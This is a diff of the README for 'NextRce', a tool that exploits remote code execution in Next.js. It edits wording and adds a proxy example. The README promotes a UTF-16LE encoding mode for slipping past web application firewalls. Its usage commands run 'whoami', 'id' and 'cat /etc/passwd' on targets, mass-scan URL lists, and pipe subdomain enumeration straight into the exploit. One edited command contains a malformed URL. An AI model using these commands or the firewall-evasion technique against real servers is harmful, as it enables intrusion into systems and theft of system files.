@@ -23,11 +23,11 @@
 
 Standard payloads containing keywords like `child_process` or `execSync` are often blocked by Web Application Firewalls (WAFs). 
 
-**NextRCSWaff.py** introduces a specialized **UTF-16LE (Little Endian)** encoding engine. By encoding the malicious payload in this specific format, the byte sequence changes completely, rendering it invisible to most signature-based WAFs. However, the Next.js (Node.js) server correctly decodes and executes the command.
+**NextRCSWaff.py** utilizes a specialized **UTF-16LE (Little Endian)** encoding engine. By encoding the malicious payload in this specific format, the byte sequence changes completely, rendering it invisible to most signature-based WAFs. However, the Next.js (Node.js) server correctly decodes and executes the command.
 
 <div align="center">
-  <img src="https://github.com/ynsmroztas/NextRce/blob/main/waf-next-js.jpg" alt="WAF Bypass Proof of Concept" width="800px">
-  <p><i>Proof of Concept: The screenshot above demonstrates a standard payload being blocked, followed by a successful RCE execution using the --bypass flag.</i></p>
+  <img src="https://github.com/ynsmroztas/NextRce/blob/main/waf-next-js.jpg" alt="WAF Bypass Proof of Concept" width="850px">
+  <p><i>Proof of Concept: The screenshot above demonstrates a standard payload being blocked (top), followed by a successful RCE execution using NextRCSWaff.py with the --bypass flag (bottom).</i></p>
 </div>
 
 ---
@@ -73,15 +73,13 @@ cd NextRce
 pip install requests
 
 💻 Usage Examples
-
 1. WAF Bypass Mode (Using NextRCSWaff.py)
 Use this script when the target appears vulnerable but standard exploits are blocked.
 
 # Enable UTF-16LE encoding with the --bypass flag
-python3 NextRCSWaff.py -u [https://target.com](https://target.com) -c "whoami" --bypass
+python3 NextRCSWaff.py -u https://target.com) -c "whoami" --bypass
 
 2. Pipeline / Bug Bounty Mode
-
 Designed for Linux pipelines. Pipe your subdomain lists directly into the tool.
 
 # Standard scan
@@ -90,17 +88,21 @@ subfinder -d target.com -silent | httpx -sc -td -title -server -silent | python3
 # WAF Bypass scan
 subfinder -d target.com -silent | httpx -sc -td -title -server -silent | python3 NextRCSWaff.py -c "id" -B
 
-3. Single Target Scan
 
+3. Single Target Scan
 Test a specific endpoint with a custom command using the standard script.
 
-python3 nextrce.py -u [https://vulnerable.target.com](https://vulnerable.target.com) -c "cat /etc/passwd"
+python3 nextrce.py -u https://vulnerable.target.com -c "cat /etc/passwd"
 
 4. Mass Scan from File
-
 Scan a list of URLs from a file with high concurrency.
 
 python3 nextrce.py -l targets.txt -c "whoami" -t 100
+
+5. Proxy Mode (Debug)
+Route traffic through Burp Suite or another proxy for analysis.
+
+python3 nextrce.py -u https://target.com -p http://127.0.0.1:8080
 
 ⚙️ Command Line Options
 
@@ -122,3 +124,4 @@ NextRce is developed and maintained by Mitsec.
 Twitter/X: @ynsmroztas
 
 GitHub: ynsmroztas
+
